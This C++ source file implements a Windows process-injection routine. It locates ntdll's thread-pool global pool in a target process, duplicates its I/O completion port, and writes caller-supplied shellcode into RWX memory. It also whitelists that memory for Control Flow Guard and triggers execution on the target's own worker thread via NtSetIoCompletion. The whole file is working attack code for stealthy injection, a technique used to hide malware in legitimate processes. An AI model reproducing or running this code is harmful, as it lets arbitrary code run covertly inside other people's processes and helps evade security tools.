#include "dispatcher.hpp"

namespace dispatcher
{
	//16 byte allignment for call target info
	struct __declspec( align( 16 ) ) dispatch_object_t
	{
		uint8_t pad_0000[ 0x38 ];
		uint64_t m_execute_callback;
		uint32_t m_numa_node;
		uint8_t m_ideal_processor;
		uint8_t pad_0045[ 0x3 ];
	};

	class c_process
	{
	public:
		c_process( const uint32_t pid )
		{
			this->m_pid = pid;
			this->m_handle = OpenProcess( PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE, FALSE, pid );
		}

		~c_process( )
		{
			if ( this->m_handle != INVALID_HANDLE_VALUE )
				CloseHandle( this->m_handle );
		}

	public:
		bool is_valid( ) const
		{
			return this->m_handle != INVALID_HANDLE_VALUE;
		}

		bool read( const uint64_t addr, void* buffer, const size_t size ) const
		{
			size_t bytes_read = 0;

			if ( !ReadProcessMemory( this->m_handle, reinterpret_cast< void* >( addr ), buffer, size, &bytes_read ) )
				return false;

			return bytes_read == size;
		}

		template<typename t>
		t read( const uint64_t addr ) const
		{
			t value{ };
			size_t bytes_read = 0;

			if ( !ReadProcessMemory( this->m_handle, reinterpret_cast< void* >( addr ), &value, sizeof( t ), &bytes_read ) )
				return value;

			if ( bytes_read != sizeof( t ) )
				return value;

			return value;
		}

		bool write( const uint64_t addr, void* buffer, const size_t size ) const
		{
			size_t bytes_written = 0;

			if ( !WriteProcessMemory( this->m_handle, reinterpret_cast< void* >( addr ), buffer, size, &bytes_written ) )
				return false;

			return bytes_written == size;
		}

		uint64_t find_pattern( const wchar_t* module_name, const char* pattern, const char* mask ) const
		{
			const MODULEENTRY32W entry = this->get_remote_module_entry( module_name );
			if ( !entry.modBaseAddr )
				return 0;

			const uint64_t image_start = reinterpret_cast< uint64_t >( entry.modBaseAddr );
			const uint64_t image_end = image_start + static_cast< uint64_t >( entry.modBaseSize );

			std::vector< char > buffer( image_end - image_start );
			this->read( image_start, buffer.data( ), buffer.size( ) );

			const size_t pattern_len = strlen( mask );
			for ( size_t i = 0; i <= buffer.size( ) - pattern_len; ++i )
			{
				bool found = true;

				for ( size_t j = 0; j < pattern_len; ++j )
				{
					if ( mask[ j ] != '?' && pattern[ j ] != buffer[ i + j ] )
					{
						found = false;
						break;
					}
				}

				if ( found )
					return image_start + i;
			}

			return 0;
		}

		uint64_t resolve_relative( const uint64_t addr, const size_t instruction_size ) const
		{
			const int32_t offset = this->read<int32_t>( addr + instruction_size - 4 );
			return addr + offset + instruction_size;
		}

		HANDLE duplicate_handle( const HANDLE target_handle ) const
		{
			HANDLE out_handle = INVALID_HANDLE_VALUE;
			if ( !DuplicateHandle( this->m_handle, target_handle, GetCurrentProcess( ), &out_handle, 0, FALSE, DUPLICATE_SAME_ACCESS ) )
				return out_handle;

			return out_handle;
		}

		uint64_t allocate( const size_t size, DWORD page_protection ) const
		{
			return reinterpret_cast< uint64_t >( VirtualAllocEx( this->m_handle, nullptr, size, MEM_COMMIT | MEM_RESERVE, page_protection ) );
		}

		void free( const uint64_t addr ) const
		{
			VirtualFreeEx( this->m_handle, reinterpret_cast< void* >( addr ), 0, MEM_RELEASE );
		}

		bool set_valid_call_targets( const uint64_t addr, const size_t size ) const
		{
			CFG_CALL_TARGET_INFO call_target_info{ };
			call_target_info.Offset = sizeof( dispatch_object_t );
			call_target_info.Flags = CFG_CALL_TARGET_VALID;

			return SetProcessValidCallTargets( this->m_handle, reinterpret_cast< void* >( addr ), size, 1, &call_target_info );
		}

	private:
		MODULEENTRY32W get_remote_module_entry( const wchar_t* module_name ) const
		{
			MODULEENTRY32W module_entry{ sizeof( MODULEENTRY32W ) };

			const HANDLE snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, this->m_pid );
			if ( snapshot == INVALID_HANDLE_VALUE )
				return module_entry;

			if ( !Module32FirstW( snapshot, &module_entry ) )
			{
				CloseHandle( snapshot );
				return module_entry;
			}

			do
			{
				if ( !_wcsicmp( module_entry.szModule, module_name ) )
				{
					CloseHandle( snapshot );
					return module_entry;
				}

			} while ( Module32NextW( snapshot, &module_entry ) );

			CloseHandle( snapshot );
			return module_entry;
		}

	private:
		uint32_t m_pid;
		HANDLE m_handle;
	};

	const e_status send( const uint32_t pid, uint8_t* code, const size_t size )
	{
		const c_process target_process( pid );
		if ( !target_process.is_valid( ) )
			return e_status::open_process_failed;

		const HMODULE ntdll = GetModuleHandleA( "ntdll.dll" );
		LOG( "[dispatcher::send]: ntdll: 0x%llx\n", reinterpret_cast< uint64_t >( ntdll ) );
		if ( !ntdll )
			return e_status::get_module_handle_failed;

		const auto nt_set_io_completion_fn = reinterpret_cast< NTSTATUS ( * )( HANDLE, PVOID, PVOID, NTSTATUS, ULONG ) >( GetProcAddress( ntdll, "NtSetIoCompletion" ) );
		LOG( "[dispatcher::send]: nt_set_io_completion_fn: 0x%llx\n", reinterpret_cast< uint64_t >( nt_set_io_completion_fn ) );
		if ( !nt_set_io_completion_fn )
			return e_status::get_proc_addr_failed;

		const uint64_t tpp_global_pool_addr = target_process.find_pattern( L"ntdll.dll", "\x48\x3B\x0D\x00\x00\x00\x00\x0F\x84\x00\x00\x00\x00\x48\x3B\x0D", "xxx????xx????xxx" ); //TppPoolpGlobalPool
		LOG( "[dispatcher::send]: tpp_global_pool_addr: 0x%llx\n", tpp_global_pool_addr );
		if ( !tpp_global_pool_addr )
			return e_status::tpp_global_pool_invalid;

		const uint64_t tpp_global_pool = target_process.read< uint64_t >( target_process.resolve_relative( tpp_global_pool_addr, 7 ) );
		LOG( "[dispatcher::send]: tpp_global_pool: 0x%llx\n", tpp_global_pool );
		if ( !tpp_global_pool )
			return e_status::tpp_global_pool_invalid;

		const HANDLE iocp_handle = target_process.read< HANDLE >( tpp_global_pool + 0x40 );
		LOG( "[dispatcher::send]: iocp_handle: 0x%llx\n", reinterpret_cast< uint64_t >( iocp_handle ) );
		if ( iocp_handle == INVALID_HANDLE_VALUE )
			return e_status::iocp_handle_invalid;

		const HANDLE local_iocp_handle = target_process.duplicate_handle( iocp_handle );
		LOG( "[dispatcher::send]: local_iocp_handle: 0x%llx\n", reinterpret_cast< uint64_t >( local_iocp_handle ) );
		if ( local_iocp_handle == INVALID_HANDLE_VALUE )
			return e_status::iocp_duplicate_invalid;

		const size_t remote_size = size + sizeof( dispatch_object_t );
		const uint64_t remote_base = target_process.allocate( remote_size, PAGE_EXECUTE_READWRITE );
		LOG( "[dispatcher::send]: remote_base: 0x%llx\n", remote_base );
		if ( !remote_base )
		{
			CloseHandle( local_iocp_handle );
			return e_status::allocation_failed;
		}

		const uint64_t dispatch_base = remote_base;
		const uint64_t shellcode_base = remote_base + sizeof( dispatch_object_t );

		dispatch_object_t dispach_object{ };
		dispach_object.m_execute_callback = shellcode_base;

		if ( !target_process.write( dispatch_base, &dispach_object, sizeof( dispatch_object_t ) ) )
		{
			CloseHandle( local_iocp_handle );
			target_process.free( remote_base );
			return e_status::write_failed;
		}

		if ( !target_process.write( shellcode_base, code, size ) )
		{
			CloseHandle( local_iocp_handle );
			target_process.free( remote_base );
			return e_status::write_failed;
		}

		if ( !target_process.set_valid_call_targets( remote_base, remote_size ) )
			LOG( "[dispatcher::send]: CFG disabled?, continuing...\n" );

		const NTSTATUS status = nt_set_io_completion_fn( local_iocp_handle, reinterpret_cast< void* >( dispatch_base ), nullptr, 0, 0 );
		LOG( "[dispatcher::send]: status: 0x%llx\n", static_cast< uint64_t >( status ) );
		if ( status != STATUS_SUCCESS )
		{
			CloseHandle( local_iocp_handle );
			target_process.free( remote_base );
			return e_status::set_completion_failed;
		}

		CloseHandle( local_iocp_handle );
		target_process.free( remote_base );

		return e_status::success;
	}
}